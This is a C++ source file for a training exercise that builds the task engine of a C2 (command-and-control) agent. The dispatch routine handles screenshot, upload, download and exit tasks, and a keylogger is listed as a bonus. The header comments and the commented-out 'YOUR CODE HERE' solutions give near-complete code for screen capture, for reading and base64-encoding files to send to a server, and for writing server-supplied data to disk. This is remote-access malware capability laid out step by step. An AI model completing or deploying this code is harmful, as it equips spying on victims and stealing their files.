/*
  Exercise 03 — C2 Agent: Task Execution Engine
  -----------------------------------------------
  Extend ex02's agent with a full task execution engine.

  Tasks to implement:
    shell      → CreateProcess + pipe, return stdout/stderr (from ex02)
    screenshot → BitBlt framebuffer, encode as base64 PNG/BMP data URL
    upload     → read a local file, base64 encode, send to server
    download   → receive base64 data from server, write to disk
    keylog     → SetWindowsHookExW(WH_KEYBOARD_LL) for 10 seconds, return chars
    exit       → clean up and ExitProcess

  Tasks:
  1. Implement takeScreenshot() → returns base64-encoded BMP bytes.
     Steps:
       a. GetDesktopWindow() → GetDC() → CreateCompatibleDC() → CreateCompatibleBitmap()
       b. BitBlt(memDC, 0,0, width,height, screenDC, 0,0, SRCCOPY)
       c. GetDIBits to get raw pixel bytes
       d. Build a BITMAPFILEHEADER + BITMAPINFOHEADER + pixels byte vector
       e. base64Encode() the result
  2. Implement uploadFile(path) → reads file, base64 encodes, returns the string.
  3. Implement downloadFile(path, data) → base64 decodes data, writes to path.
  4. Implement dispatchTask(taskType, taskData) → routes to above functions.
  5. Integrate into the beacon loop (extend ex02 beaconLoop).

  BONUS:
  - Implement a 10-second low-level keyboard hook (keylog task).
  - Compress screenshot bytes with RLE or zlib before base64 encoding.

  Compile:
    cl /std:c++17 ex03_task_engine.cpp /link wininet.lib gdi32.lib /OUT:agent.exe
*/

#pragma comment(lib, "gdi32.lib")
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <cstdio>

// ------ Base64 encode ------
static const char* B64 =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64Encode(const std::vector<BYTE>& data) {
    std::string out;
    size_t i = 0;
    while (i + 2 < data.size()) {
        DWORD v = (data[i]<<16)|(data[i+1]<<8)|data[i+2];
        out += B64[(v>>18)&63]; out += B64[(v>>12)&63];
        out += B64[(v>>6)&63];  out += B64[v&63];
        i += 3;
    }
    if (i + 1 == data.size()) {
        DWORD v = data[i]<<16;
        out += B64[(v>>18)&63]; out += B64[(v>>12)&63]; out += "==";
    } else if (i + 2 == data.size()) {
        DWORD v = (data[i]<<16)|(data[i+1]<<8);
        out += B64[(v>>18)&63]; out += B64[(v>>12)&63]; out += B64[(v>>6)&63]; out += '=';
    }
    return out;
}

std::vector<BYTE> base64Decode(const std::string& s) {
    std::vector<BYTE> out;
    std::string inv(256, -1);
    for (int i = 0; i < 64; i++) inv[(BYTE)B64[i]] = (char)i;
    size_t i = 0;
    while (i + 3 < s.size()) {
        if (s[i]=='=' || s[i+1]=='=' || s[i+2]=='=' || s[i+3]=='=') break;
        DWORD v = (inv[(BYTE)s[i]]<<18)|(inv[(BYTE)s[i+1]]<<12)|
                  (inv[(BYTE)s[i+2]]<<6)|inv[(BYTE)s[i+3]];
        out.push_back((v>>16)&0xFF);
        out.push_back((v>>8)&0xFF);
        out.push_back(v&0xFF);
        i += 4;
    }
    return out;
}

// ---------- TODO 1: takeScreenshot ----------
std::string takeScreenshot() {
    // YOUR CODE HERE:
    // int w = GetSystemMetrics(SM_CXSCREEN);
    // int h = GetSystemMetrics(SM_CYSCREEN);
    // HDC hScreen = GetDC(nullptr);
    // HDC hMem    = CreateCompatibleDC(hScreen);
    // HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    // SelectObject(hMem, hBmp);
    // BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    //
    // BITMAPINFOHEADER bi = { sizeof(bi), w, -h, 1, 24, BI_RGB };
    // DWORD stride = ((w * 3 + 3) & ~3);
    // std::vector<BYTE> pixels(stride * h);
    // GetDIBits(hMem, hBmp, 0, h, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    //
    // BITMAPFILEHEADER bf = { 0x4D42 };
    // DWORD headerSize = sizeof(bf) + sizeof(bi);
    // bf.bfSize = headerSize + (DWORD)pixels.size();
    // bf.bfOffBits = headerSize;
    //
    // std::vector<BYTE> bmp;
    // bmp.insert(bmp.end(), (BYTE*)&bf, (BYTE*)&bf + sizeof(bf));
    // bmp.insert(bmp.end(), (BYTE*)&bi, (BYTE*)&bi + sizeof(bi));
    // bmp.insert(bmp.end(), pixels.begin(), pixels.end());
    //
    // DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(nullptr, hScreen);
    // return base64Encode(bmp);
    return "[screenshot not implemented]";
}

// ---------- TODO 2: uploadFile ----------
std::string uploadFile(const std::string& path) {
    // YOUR CODE HERE:
    // std::ifstream f(path, std::ios::binary);
    // if (!f) return "[file not found]";
    // std::vector<BYTE> data(std::istreambuf_iterator<char>(f), {});
    // return base64Encode(data);
    (void)path;
    return "[upload not implemented]";
}

// ---------- TODO 3: downloadFile ----------
bool downloadFile(const std::string& path, const std::string& b64data) {
    // YOUR CODE HERE:
    // auto data = base64Decode(b64data);
    // std::ofstream f(path, std::ios::binary);
    // if (!f) return false;
    // f.write((char*)data.data(), data.size());
    // return true;
    (void)path; (void)b64data;
    return false;
}

// ---------- TODO 4: dispatchTask ----------
std::string dispatchTask(const std::string& taskType, const std::string& taskData) {
    if (taskType == "screenshot") return takeScreenshot();
    if (taskType == "upload")     return uploadFile(taskData);
    if (taskType == "download") {
        // taskData format: "path|base64data"
        size_t sep = taskData.find('|');
        if (sep != std::string::npos) {
            bool ok = downloadFile(taskData.substr(0, sep), taskData.substr(sep+1));
            return ok ? "[download ok]" : "[download failed]";
        }
        return "[invalid download format]";
    }
    if (taskType == "exit") ExitProcess(0);
    return "[unknown task: " + taskType + "]";
}

int main() {
    printf("[*] Task Engine Test\n");
    printf("[*] Screenshot: %s\n", takeScreenshot().substr(0, 40).c_str());
    printf("[*] Upload non-existent: %s\n", uploadFile("C:\\no_such_file.txt").c_str());
    return 0;
}
